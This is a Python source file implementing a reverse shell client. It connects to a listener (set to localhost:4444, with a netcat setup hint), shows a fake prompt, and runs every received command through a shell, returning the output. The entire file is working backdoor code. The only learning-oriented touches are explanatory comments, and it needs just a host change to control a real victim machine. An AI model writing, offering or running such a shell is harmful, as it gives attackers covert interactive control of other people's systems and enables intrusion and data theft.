import socket
import signal
import os
import subprocess

s = socket.socket() # client computer can connect to others

# ip address of server
# spin up the server with `nc -l localhost 4444``
host = "localhost"
port = 4444

# open a socket to the server
s.connect((host, port))

def closeServer():
  # close connection (won't get reached bc of while loop, but that's okay this is good habit)
  s.close()
  exit(0)

# handle graceful socket closing on SIGTERM
signal.signal(signal.SIGTERM, closeServer)

# infinite loop for continuous listening for server's commands
while True:
  # send the current working directory so it looks like a real shell
  s.send(str.encode(str(os.getcwd()) + '> '))

  # get the command input from server
  data = s.recv(1024)

  # handle the server telling the client to exit
  if data[:4].decode("utf-8") == 'exit':
    s.close()
    exit(0)

  # the `cd` command is special, we need to change python's context
  if data[:2].decode("utf-8") == 'cd':
    os.chdir(data[3:-1].decode("utf-8")) # the -1 removes the \n from the end of the line
    continue

  # check if there are actually data/commands received (that is not cd)
  if len(data) > 0:
    # opens up a process to run a command similar to running in terminal, takes out any output and pipes out to standard stream
    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
    # bytes and string versions of results
    output_bytes = cmd.stdout.read() + cmd.stderr.read() # bytes version of streamed output
    output_str = str(output_bytes, "utf-8") # plain old basic string
    # send the command output back to the server
    s.send(str.encode(output_str))